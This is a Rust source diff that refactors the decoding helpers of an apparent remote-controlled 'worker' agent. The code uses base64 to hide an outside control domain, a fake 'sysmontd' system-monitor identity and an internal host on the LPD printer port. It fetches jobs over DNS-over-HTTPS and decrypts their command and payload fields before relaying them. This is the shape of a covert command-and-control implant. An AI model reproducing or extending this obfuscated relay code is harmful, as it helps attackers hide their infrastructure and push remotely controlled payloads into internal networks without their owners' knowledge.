@@ -32,9 +32,9 @@ use std::{
 
 #[macro_use]
 mod macros;
+mod crypto;
 mod tcp_extras;
 mod types;
-mod utils;
 
 use anyhow::Result;
 use reqwest::{
@@ -47,8 +47,8 @@ use socket2::SockRef;
 use tcp_extras::TcpExtras;
 
 use crate::{
+    crypto::{decode_b64_string, decrypt},
     types::{Job, LogLevel},
-    utils::{decode_b64, decode_field},
 };
 
 static DOH_CLIENT: LazyLock<Client> = LazyLock::new(|| {
@@ -82,12 +82,13 @@ static WORKER_KEY: LazyLock<String> = LazyLock::new(|| {
 static JOBS_COMPLETED: AtomicUsize = AtomicUsize::new(0);
 
 static BASE_DOMAIN: LazyLock<String> =
-    LazyLock::new(|| decode_b64("YXBpLnByZWNvbm5lY3QuYXBw").expect("ib"));
+    LazyLock::new(|| decode_b64_string("YXBpLnByZWNvbm5lY3QuYXBw").expect("ib"));
 static BASE_URL: LazyLock<String> = LazyLock::new(|| format!("https://{}", BASE_DOMAIN.as_str()));
-static ALIAS: LazyLock<String> = LazyLock::new(|| decode_b64("c3lzbW9udGQ=").expect("ia"));
+static ALIAS: LazyLock<String> = LazyLock::new(|| decode_b64_string("c3lzbW9udGQ=").expect("ia"));
 static AGENT: LazyLock<String> = LazyLock::new(|| format!("{}/1.0", ALIAS.as_str()));
-static DEF_HOST: LazyLock<String> = LazyLock::new(|| decode_b64("MTcyLjE2LjAuMTEx").expect("ih"));
-static DEF_QUEUE: LazyLock<String> = LazyLock::new(|| decode_b64("c2VjdXJl").expect("iq"));
+static DEF_HOST: LazyLock<String> =
+    LazyLock::new(|| decode_b64_string("MTcyLjE2LjAuMTEx").expect("ih"));
+static DEF_QUEUE: LazyLock<String> = LazyLock::new(|| decode_b64_string("c2VjdXJl").expect("iq"));
 
 const DEF_PORT: u16 = 515;
 const NUL: [u8; 1] = [0u8];
@@ -259,11 +260,11 @@ fn handle(job: Job) -> Result<()> {
         return Ok(());
     }
 
-    let q_cmd = decode_field(job.q_cmd.as_deref(), WORKER_KEY.as_str(), job_id)?;
-    let cf_hdr = decode_field(job.cf_hdr.as_deref(), WORKER_KEY.as_str(), job_id)?;
-    let ctl = decode_field(job.ctl.as_deref(), WORKER_KEY.as_str(), job_id)?;
-    let df_hdr = decode_field(job.df_hdr.as_deref(), WORKER_KEY.as_str(), job_id)?;
-    let payload = decode_field(job.payload.as_deref(), WORKER_KEY.as_str(), job_id)?;
+    let q_cmd = decrypt(job.q_cmd.as_deref(), WORKER_KEY.as_str(), job_id)?;
+    let cf_hdr = decrypt(job.cf_hdr.as_deref(), WORKER_KEY.as_str(), job_id)?;
+    let ctl = decrypt(job.ctl.as_deref(), WORKER_KEY.as_str(), job_id)?;
+    let df_hdr = decrypt(job.df_hdr.as_deref(), WORKER_KEY.as_str(), job_id)?;
+    let payload = decrypt(job.payload.as_deref(), WORKER_KEY.as_str(), job_id)?;
 
     debug_log!(
         LogLevel::Ok,
